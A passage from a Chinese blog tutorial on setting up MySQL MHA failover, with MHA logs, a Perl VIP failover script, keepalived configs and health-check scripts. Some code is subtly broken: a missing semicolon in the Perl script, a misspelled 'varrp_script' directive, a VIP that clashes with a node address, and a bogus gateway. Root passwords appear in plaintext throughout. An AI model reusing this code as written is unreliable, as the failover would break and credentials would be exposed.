binlog_do_db= , binlog_ignore_db=</div><div class="line">Tue May 13 08:10:54 2014 - [info] Replication filtering check ok.</div><div class="line">Tue May 13 08:10:54 2014 - [info] GTID (with auto-pos) is not supported</div><div class="line">Tue May 13 08:10:54 2014 - [info] Starting SSH connection tests..</div><div class="line">Tue May 13 08:10:55 2014 - [info] All SSH connection tests passed successfully.</div><div class="line">Tue May 13 08:10:55 2014 - [info] Checking MHA Node version..</div><div class="line">Tue May 13 08:10:55 2014 - [info] Version check ok.</div><div class="line">Tue May 13 08:10:55 2014 - [info] Checking SSH publickey authentication settings on the current master..</div><div class="line">Tue May 13 08:10:56 2014 - [info] HealthCheck: SSH to node1 is reachable.</div><div class="line">Tue May 13 08:10:56 2014 - [info] Master MHA Node version is 0.56.</div><div class="line">Tue May 13 08:10:56 2014 - [info] Checking recovery script configurations on node1(192.168.10.216:3306)..</div><div class="line">Tue May 13 08:10:56 2014 - [info] Executing command: save_binary_logs --command=test --start_pos=4 --binlog_dir=/usr/local/mysql/logs --output_file=/var/tmp/save_binary_logs_test --manager_version=0.56 --start_file=mysql-bin.000009</div><div class="line">Tue May 13 08:10:56 2014 - [info] Connecting to root@192.168.10.216(node1:22)..</div><div class="line">  Creating /var/tmp if not exists.. ok.</div><div class="line">  Checking output directory is accessible or not..</div><div class="line">   ok.</div><div class="line">  Binlog found at /usr/local/mysql/logs, up to mysql-bin.000009</div><div class="line">Tue May 13 08:10:56 2014 - [info] Binlog setting check done.</div><div class="line">Tue May 13 08:10:56 2014 - [info] Checking SSH publickey authentication and checking recovery script configurations on all alive slave servers..</div><div class="line">Tue May 13 08:10:56 2014 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=node2 --slave_ip=192.168.10.217 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.16-64.2-rel64.2-log --manager_version=0.56 --relay_log_info=/usr/local/mysql/data/relay-log.info --relay_dir=/usr/local/mysql/data/ --slave_pass=xxx</div><div class="line">Tue May 13 08:10:56 2014 - [info] Connecting to root@192.168.10.217(node2:22)..</div><div class="line">  Checking slave recovery environment settings..</div><div class="line">    Opening /usr/local/mysql/data/relay-log.info ... ok.</div><div class="line">    Relay log found at /usr/local/mysql/logs, up to relay-bin.000006</div><div class="line">    Temporary relay log file is /usr/local/mysql/logs/relay-bin.000006</div><div class="line">    Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure.</div><div class="line"> done.</div><div class="line">    Testing mysqlbinlog output.. done.</div><div class="line">    Cleaning up test file(s).. done.</div><div class="line">Tue May 13 08:10:57 2014 - [info] Executing command : apply_diff_relay_logs --command=test --slave_user=&apos;root&apos; --slave_host=node3 --slave_ip=192.168.10.218 --slave_port=3306 --workdir=/var/tmp --target_version=5.6.16-64.2-rel64.2-log --manager_version=0.56 --relay_log_info=/usr/local/mysql/data/relay-log.info --relay_dir=/usr/local/mysql/data/ --slave_pass=xxx</div><div class="line">Tue May 13 08:10:57 2014 - [info] Connecting to root@192.168.10.218(node3:22)..</div><div class="line">  Checking slave recovery environment settings..</div><div class="line">    Opening /usr/local/mysql/data/relay-log.info ... ok.</div><div class="line">    Relay log found at /usr/local/mysql/logs, up to relay-bin.000006</div><div class="line">    Temporary relay log file is /usr/local/mysql/logs/relay-bin.000006</div><div class="line">    Testing mysql connection and privileges..Warning: Using a password on the command line interface can be insecure.</div><div class="line"> done.</div><div class="line">    Testing mysqlbinlog output.. done.</div><div class="line">    Cleaning up test file(s).. done.</div><div class="line">Tue May 13 08:10:57 2014 - [info] Slaves settings check done.</div><div class="line">Tue May 13 08:10:57 2014 - [info]</div><div class="line">node1(192.168.10.216:3306) (current master)</div><div class="line"> +--node2(192.168.10.217:3306)</div><div class="line"> +--node3(192.168.10.218:3306)</div><div class="line">Tue May 13 08:10:57 2014 - [info] Checking replication health on node2..</div><div class="line">Tue May 13 08:10:57 2014 - [info] ok.</div><div class="line">Tue May 13 08:10:57 2014 - [info] Checking replication health on node3..</div><div class="line">Tue May 13 08:10:57 2014 - [info] ok.</div><div class="line">Tue May 13 08:10:57 2014 - [warning] master_ip_failover_script is not defined.</div><div class="line">Tue May 13 08:10:57 2014 - [warning] shutdown_script is not defined.</div><div class="line">Tue May 13 08:10:57 2014 - [info] Got exit code 0 (Not master dead).</div><div class="line">MySQL Replication Health is OK.</div></pre></td></tr></table></figure></p>
<p><strong>G.</strong> 启动MHA manager，并监控日志文件<br>在node1上killall mysqld的同时在node3上启动manager服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[root@localhost mha]# masterha_manager --conf=/etc/mha/app1/app1.cnf</div><div class="line">Tue May 13 08:19:01 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..</div><div class="line">Tue May 13 08:19:01 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 08:19:01 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..</div><div class="line">  Creating /var/tmp if not exists.. ok.</div><div class="line">  Checking output directory is accessible or not..</div><div class="line">   ok.</div><div class="line">  Binlog found at /usr/local/mysql/logs, up to mysql-bin.000009</div><div class="line">Tue May 13 08:19:18 2014 - [info] Reading default configuration from /etc/masterha_default.cnf..</div><div class="line">Tue May 13 08:19:18 2014 - [info] Reading application default configuration from /etc/mha/app1/app1.cnf..</div><div class="line">Tue May 13 08:19:18 2014 - [info] Reading server configuration from /etc/mha/app1/app1.cnf..</div></pre></td></tr></table></figure></p>
<p>之后观察node3上/var/log/mha/app1/manager.log日志会发现node1 dead状态，主自动切换到node2上，而node3上的主从配置指向了node2，并且发生一次切换后会生成/var/log/mha/app1/app1.failover.complete文件；</p>
<p><strong>手动恢复node1操作：</strong><br>rm -rf /var/log/mha/app1/app1.failover.complete<br>启动node1上的mysql，重新配置node2 node3 主从指向node1（change master to）</p>
<p><strong>MHA Manager后台执行：</strong><br>nohup masterha_manager —conf=/etc/mha/app1/app1.cnf &lt; /dev/null &gt; /var/log/mha/app1/app1.log 2&gt;&amp;1</p>
<p>守护进程方式参考： <a href="https://code.google.com/p/mysql-master-ha/wiki/Runnning_Background" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Runnning_Background</a><br><a href="ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/weberho:/qmailtoaster/openSUSE_Tumbleweed/x86_64/daemontools-0.76-5.3.x86_64.rpm" target="_blank" rel="external">ftp://ftp.pbone.net/mirror/ftp5.gwdg.de/pub/opensuse/repositories/home:/weberho:/qmailtoaster/openSUSE_Tumbleweed/x86_64/daemontools-0.76-5.3.x86_64.rpm</a></p>
<h4 id="配置VIP的方式"><a href="#配置VIP的方式" class="headerlink" title="配置VIP的方式"></a>配置VIP的方式</h4><p><strong>A.</strong>通过全局配置文件实现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">vim /etc/mha/masterha_default.cnf</div><div class="line">[server default]</div><div class="line">user=root</div><div class="line">password=geekwolf</div><div class="line">ssh_user=root</div><div class="line">repl_user=rep</div><div class="line">repl_password=geekwolf</div><div class="line">ping_interval=1</div><div class="line">secondary_check_script = masterha_secondary_check -s node1 -s node2 -s node3 --user=root --master_host=node1 --master_ip=192.168.10.216 --master_port=3306</div><div class="line">master_ip_failover_script=&quot;/etc/mha/scripts/master_ip_failover&quot;</div><div class="line">master_ip_online_change_script=&quot;/etc/mha/scripts/master_ip_online_change&quot;</div><div class="line">#shutdown_script= /script/masterha/power_manager</div><div class="line">#report_script=&quot;&quot;</div></pre></td></tr></table></figure></p>
<p>修改后的master_ip_failover、master_ip_online_change脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env perl</div><div class="line">use strict;</div><div class="line">use warnings FATAL =&gt; &apos;all&apos;;</div><div class="line">use Getopt::Long;</div><div class="line">my (</div><div class="line">    $command, $ssh_user, $orig_master_host, $orig_master_ip,</div><div class="line">    $orig_master_port, $new_master_host, $new_master_ip, $new_master_port</div><div class="line">);</div><div class="line">my $vip = &apos;192.168.10.218&apos;; # Virtual IP</div><div class="line">my $gateway = &apos;192.168.10.1&apos;;#Gateway IP</div><div class="line">my $interface = &apos;eth0&apos;</div><div class="line">my $key = &quot;1&quot;;</div><div class="line">my $ssh_start_vip = &quot;/sbin/ifconfig $interface:$key $vip;/sbin/arping -I $interface -c 3 -s $vip $gateway &gt;/dev/null 2&gt;&amp;1&quot;;</div><div class="line">my $ssh_stop_vip = &quot;/sbin/ifconfig $interface:$key down&quot;;</div><div class="line">GetOptions(</div><div class="line">    &apos;command=s&apos; =&gt; \$command,</div><div class="line">    &apos;ssh_user=s&apos; =&gt; \$ssh_user,</div><div class="line">    &apos;orig_master_host=s&apos; =&gt; \$orig_master_host,</div><div class="line">    &apos;orig_master_ip=s&apos; =&gt; \$orig_master_ip,</div><div class="line">    &apos;orig_master_port=i&apos; =&gt; \$orig_master_port,</div><div class="line">    &apos;new_master_host=s&apos; =&gt; \$new_master_host,</div><div class="line">    &apos;new_master_ip=s&apos; =&gt; \$new_master_ip,</div><div class="line">    &apos;new_master_port=i&apos; =&gt; \$new_master_port,</div><div class="line">);</div><div class="line">exit &amp;main();</div><div class="line">sub main &#123;</div><div class="line">    print &quot;\n\nIN SCRIPT TEST====$ssh_stop_vip==$ssh_start_vip===\n\n&quot;;</div><div class="line">    if ( $command eq &quot;stop&quot; || $command eq &quot;stopssh&quot; ) &#123;</div><div class="line">        # $orig_master_host, $orig_master_ip, $orig_master_port are passed.</div><div class="line">        # If you manage master ip address at global catalog database,</div><div class="line">        # invalidate orig_master_ip here.</div><div class="line">        my $exit_code = 1;</div><div class="line">        eval &#123;</div><div class="line">            print &quot;Disabling the VIP on old master: $orig_master_host \n&quot;;</div><div class="line">            &amp;stop_vip();</div><div class="line">            $exit_code = 0;</div><div class="line">        &#125;;</div><div class="line">        if ($@) &#123;</div><div class="line">            warn &quot;Got Error: $@\n&quot;;</div><div class="line">            exit $exit_code;</div><div class="line">        &#125;</div><div class="line">        exit $exit_code;</div><div class="line">    &#125;</div><div class="line">    elsif ( $command eq &quot;start&quot; ) &#123;</div><div class="line">        # all arguments are passed.</div><div class="line">        # If you manage master ip address at global catalog database,</div><div class="line">        # activate new_master_ip here.</div><div class="line">        # You can also grant write access (create user, set read_only=0, etc) here.</div><div class="line">        my $exit_code = 10;</div><div class="line">        eval &#123;</div><div class="line">            print &quot;Enabling the VIP - $vip on the new master - $new_master_host \n&quot;;</div><div class="line">            &amp;start_vip();</div><div class="line">            $exit_code = 0;</div><div class="line">        &#125;;</div><div class="line">        if ($@) &#123;</div><div class="line">            warn $@;</div><div class="line">            exit $exit_code;</div><div class="line">        &#125;</div><div class="line">        exit $exit_code;</div><div class="line">    &#125;</div><div class="line">    elsif ( $command eq &quot;status&quot; ) &#123;</div><div class="line">        print &quot;Checking the Status of the script.. OK \n&quot;;</div><div class="line">        `ssh $ssh_user\@cluster1 \&quot; $ssh_start_vip \&quot;`;</div><div class="line">        exit 0;</div><div class="line">    &#125;</div><div class="line">    else &#123;</div><div class="line">        &amp;usage();</div><div class="line">        exit 1;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"># A simple system call that enable the VIP on the new master</div><div class="line">sub start_vip() &#123;</div><div class="line">    `ssh $ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`;</div><div class="line">&#125;</div><div class="line"># A simple system call that disable the VIP on the old_master</div><div class="line">sub stop_vip() &#123;</div><div class="line">    `ssh $ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`;</div><div class="line">&#125;</div><div class="line">sub usage &#123;</div><div class="line">    print</div><div class="line">    &quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><strong>B.</strong>通过第三方HA（keepalived、heartbeat）实现VIP，以keepalived为例</p>
<p>以node1 node2互为主备进行配置keepalived<br>在node1 node2上分别下载安装keepalived<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">wget [http://www.keepalived.org/software/keepalived-1.2.13.tar.gz](http://www.keepalived.org/software/keepalived-1.2.13.tar.gz)</div><div class="line">yum -y install popt-*</div><div class="line">./configure —prefix=/usr/local/keepalived —enable-snmp</div><div class="line">make &amp;&amp; make install</div><div class="line">cp /usr/local/keepalived/etc/rc.d/init.d/keepalived /etc/rc.d/init.d/</div><div class="line">cp /usr/local/keepalived/etc/sysconfig/keepalived /etc/sysconfig/</div><div class="line">chmod +x /etc/rc.d/init.d/keepalived</div><div class="line">chkconfig keepalived on</div><div class="line">mkdir /etc/keepalived</div><div class="line">ln -s /usr/local/keepalived/sbin/keepalived /usr/sbin</div></pre></td></tr></table></figure></p>
<p>修改node1(192.168.10.216)配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">vim /etc/keepalived/keepalived.conf</div><div class="line"></div><div class="line">! Configuration File for keepalived</div><div class="line">global_defs &#123;</div><div class="line"> router_id MHA </div><div class="line"> notification_email &#123;</div><div class="line"> root@localhost   #接收邮件，可以有多个，一行一个</div><div class="line">&#125;</div><div class="line"> #当主、备份设备发生改变时，通过邮件通知</div><div class="line"> notification_email_from  m@localhost</div><div class="line"> #发送邮箱服务器</div><div class="line"> smtp_server 127.0.0.1</div><div class="line"> #发送邮箱超时时间</div><div class="line"> smtp_connect_timeout 30</div><div class="line"> &#125;</div><div class="line"></div><div class="line">varrp_script check_mysql &#123;</div><div class="line">     script &quot;/etc/keepalived/check_mysql.sh&quot;</div><div class="line">&#125;</div><div class="line">vrrp_sync_group VG1 &#123;</div><div class="line">    group &#123;</div><div class="line">          VI_1</div><div class="line">    &#125;</div><div class="line">notify_master &quot;/etc/keepalived/master.sh&quot;</div><div class="line">&#125;</div><div class="line"></div><div class="line">vrrp_instance VI_1 &#123;</div><div class="line">     state master     </div><div class="line">     interface eth0   </div><div class="line">     virtual_router_id 110</div><div class="line">     priority 100            </div><div class="line">     advert_int 1</div><div class="line">     nopreempt #不抢占资源，意思就是它活了之后也不会再把主抢回来</div><div class="line"></div><div class="line">     authentication &#123;</div><div class="line">     # 认证方式，可以是PASS或AH两种认证方式</div><div class="line">     auth_type PASS</div><div class="line">     # 认证密码</div><div class="line">     auth_pass geekwolf</div><div class="line">     &#125;</div><div class="line">track_script &#123;</div><div class="line">     check_mysql</div><div class="line">&#125;</div><div class="line">virtual_ipaddress &#123;</div><div class="line">     192.168.10.219</div><div class="line">     &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>修改node2(192.168.10.217)配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">vim /etc/keepalived/keepalived.conf</div><div class="line"></div><div class="line">! Configuration File for keepalived</div><div class="line">global_defs &#123;</div><div class="line"> router_id MHA </div><div class="line"> notification_email &#123;</div><div class="line"> root@localhost   #接收邮件，可以有多个，一行一个</div><div class="line">&#125;</div><div class="line"> #当主、备份设备发生改变时，通过邮件通知</div><div class="line"> notification_email_from  m@localhost</div><div class="line"> #发送邮箱服务器</div><div class="line"> smtp_server 127.0.0.1</div><div class="line"> #发送邮箱超时时间</div><div class="line"> smtp_connect_timeout 30</div><div class="line"> &#125;</div><div class="line"></div><div class="line">varrp_script check_mysql &#123;</div><div class="line">     script &quot;/etc/keepalived/check_mysql.sh&quot;</div><div class="line">&#125;</div><div class="line">vrrp_sync_group VG1 &#123;</div><div class="line">    group &#123;</div><div class="line">          VI_1</div><div class="line">    &#125;</div><div class="line">notify_master &quot;/etc/keepalived/master.sh&quot;</div><div class="line">&#125;</div><div class="line">vrrp_instance VI_1 &#123;</div><div class="line">     state backup    </div><div class="line">     interface eth0    </div><div class="line">     virtual_router_id 110</div><div class="line">     priority 99            </div><div class="line">     advert_int 1</div><div class="line"></div><div class="line">     authentication &#123;</div><div class="line">     # 认证方式，可以是PASS或AH两种认证方式</div><div class="line">     auth_type PASS</div><div class="line">     # 认证密码</div><div class="line">     auth_pass geekwolf</div><div class="line">     &#125;</div><div class="line">track_script &#123;</div><div class="line">     check_mysql</div><div class="line">&#125;</div><div class="line">virtual_ipaddress &#123;</div><div class="line">     192.168.10.219</div><div class="line">     &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>check_mysql.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">MYSQL=/usr/local/mysql/bin/mysql</div><div class="line">MYSQL_HOST=127.0.0.1</div><div class="line">MYSQL_USER=root</div><div class="line">MYSQL_PASSWORD=geekwolf</div><div class="line">CHECK_TIME=3</div><div class="line">#mysql  is working MYSQL_OK is 1 , mysql down MYSQL_OK is 0</div><div class="line">MYSQL_OK=1</div><div class="line">function check_mysql_helth ()&#123;</div><div class="line">$MYSQL -h $MYSQL_HOST -u $MYSQL_USER -e &quot;show status;&quot; &gt;/dev/null 2&gt;&amp;1</div><div class="line">if [ $? = 0 ] ;then</div><div class="line">     MYSQL_OK=1</div><div class="line">else</div><div class="line">     MYSQL_OK=0</div><div class="line">fi</div><div class="line">     return $MYSQL_OK</div><div class="line">&#125;</div><div class="line">while [ $CHECK_TIME -ne 0 ]</div><div class="line">do</div><div class="line">     let &quot;CHECK_TIME -= 1&quot;</div><div class="line">     check_mysql_helth</div><div class="line">if [ $MYSQL_OK = 1 ] ; then</div><div class="line">     CHECK_TIME=0</div><div class="line">     exit 0</div><div class="line">fi</div><div class="line">if [ $MYSQL_OK -eq 0 ] &amp;&amp;  [ $CHECK_TIME -eq 0 ]</div><div class="line">then</div><div class="line">     pkill keepalived</div><div class="line">exit 1</div><div class="line">fi</div><div class="line">sleep 1</div><div class="line">done</div></pre></td></tr></table></figure></p>
<p>master.sh<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">VIP=192.168.10.219</div><div class="line">GATEWAY=1.1</div><div class="line">/sbin/arping -I eth0 -c 5 -s $VIP $GATEWAY &amp;&gt;/dev/null</div><div class="line">chmod +x /etc/keepalived/check_mysql.sh</div><div class="line">chmod +x /etc/keepalived/master.sh</div></pre></td></tr></table></figure></p>
<h4 id="MHA常用命令"><a href="#MHA常用命令" class="headerlink" title="MHA常用命令"></a>MHA常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">查看manager状态</div><div class="line">masterha_check_status —conf=/etc/mha/app1/app1.cnf</div><div class="line"></div><div class="line">查看免密钥是否正常</div><div class="line">masterha_check_ssh —conf=/etc/mha/app1/app1.cnf</div><div class="line"></div><div class="line">查看主从复制是否正常</div><div class="line">masterha_check_repl —conf=/etc/mha/app1/app1.cnf</div><div class="line"></div><div class="line">添加新节点server4到配置文件</div><div class="line">masterha_conf_host —command=add —conf=/etc/mha/app1/app1.cnf —hostname=geekwolf —block=server4 —params=“no_master=1;ignore_fail=1” 删除server4节点</div><div class="line">masterha_conf_host —command=delete —conf=/etc/mha/app1/app1.cnf —block=server4</div></pre></td></tr></table></figure>
<p><strong>注：</strong><br>block:为节点区名，默认值 为[server_$hostname],如果设置成block=100，则为[server100] params:参数，分号隔开(参考<a href="https://code.google.com/p/mysql-master-ha/wiki/Parameters" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha/wiki/Parameters</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">关闭manager服务</div><div class="line">masterha_stop —conf=/etc/mha/app1/app1.cnf</div><div class="line"></div><div class="line">主手动切换(前提不要启动masterha_manager服务)</div><div class="line">在主node1存活情况下进行切换</div><div class="line">交互模式：</div><div class="line">masterha_master_switch —master_state=alive —conf=/etc/mha/app1/app1.cnf —new_master_host=node2</div><div class="line">非交互模式：</div><div class="line">masterha_master_switch —master_state=alive —conf=/etc/mha/app1/app1.cnf —new_master_host=node2 —interactive=0</div><div class="line">在主node1宕掉情况下进行切换</div><div class="line">masterha_master_switch —master_state=dead —conf=/etc/mha/app1/app1.cnf —dead_master_host=node1 —dead_master_ip=192.168.10.216 —dead_master_port=3306 —new_master_host=192.168.10.217 详细请参考:[https://code.google.com/p/mysql-master-ha/wiki/TableOfContents?tm=6](https://code.google.com/p/mysql-master-ha/wiki/TableOfContents?tm=6) *</div></pre></td></tr></table></figure></p>
<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><p><strong>A.</strong> 以上两种vip切换方式，建议采用第一种方法<br><strong>B.</strong> 发生主备切换后，manager服务会自动停掉，且在/var/log/mha/app1下面生成<br>app1.failover.complete，若再次发生切换需要删除app1.failover.complete文件<br><strong>C.</strong> 测试过程发现一主两从的架构(两从都设置可以担任主角色candidate_master=1)，当旧主故障迁移到备主后，删除app1.failover.complete，再次启动manager，停掉新主后，发现无法正常切换(解决方式：删除/etc/mha/app1/app1.cnf里面的旧主node1的信息后，重新切换正常)<br><strong>D.</strong> arp缓存导致切换VIP后，无法使用问题<br><strong>E.</strong> 使用Semi-Sync能够最大程度保证数据安全<br><strong>F.</strong> Purge_relay_logs脚本删除中继日志不会阻塞SQL线程，在每台从节点上设置计划任务定期清除中继日志<br><code>0 5 * * * root /usr/bin/purge_relay_logs —user=root —password=geekwolf —disable_relay_log_purge &gt;&gt; /var/log/mha/purge_relay_logs.log 2&gt;&amp;1</code></p>
<h4 id="部署过程遇到的问题"><a href="#部署过程遇到的问题" class="headerlink" title="部署过程遇到的问题"></a>部署过程遇到的问题</h4><p><strong>问题1：</strong> [root@node1 mha4mysql-node-0.56]# perl Makefile.PL<br>Can’t locate ExtUtils/MakeMaker.pm in @INC (@INC contains: inc /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/Makefile.pm line 4.<br>BEGIN failed—compilation aborted at inc/Module/Install/Makefile.pm line 4. Compilation failed in require at inc/Module/Install.pm line 283.<br>Can’t locate ExtUtils/MakeMaker.pm in @INC (@INC contains: inc /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/<br>vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/Can.pm line 6.<br>BEGIN failed—compilation aborted at inc/Module/Install/Can.pm line 6.<br>Compilation failed in require at inc/Module/Install.pm line 283.<br>Can’t locate ExtUtils/MM_Unix.pm in @INC (@INC contains: inc /usr/local/lib64/<br>perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at inc/Module/Install/<br>Metadata.pm line 349.<br><strong>解决办法：</strong><br>yum -y install perl-CPAN perl-devel perl-DBD-MySQL</p>
<p><strong>问题2：</strong><br>Can’t locate Time/HiRes.pm in @INC (@INC contains: /usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .) at /usr/local/share/perl5/MHA/SSHCheck.pm line 28.<br>BEGIN failed—compilation aborted at /usr/local/share/perl5/MHA/SSHCheck.pm line 28.<br>Compilation failed in require at /usr/local/bin/masterha_check_ssh line 25. BEGIN failed—compilation aborted at /usr/local/bin/masterha_check_ssh line 25.<br><strong>解决办法</strong>：<br>yum -y install perl-Time-HiRes</p>
<p><strong>问题3：</strong></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/2014/08/mhaq.jpg" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/2014/08/mhaq.jpg" alt="mhaq"></a></p>
<p><strong>解决办法:</strong><br>每个节点都做好mysql命令的软链<br>ln -s /usr/local/mysql/bin/* /usr/local/bin/</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="https://code.google.com/p/mysql-master-ha" target="_blank" rel="external">https://code.google.com/p/mysql-master-ha</a><br><a href="http://blog.chinaunix.net/uid-28437434-id-3476641.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-28437434-id-3476641.html</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mha </tag>
            
            <tag> MySQL高可用 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[存储引擎介绍及适用场景]]></title>
      <url>/2014/08/20/mysql-engine-info.html</url>
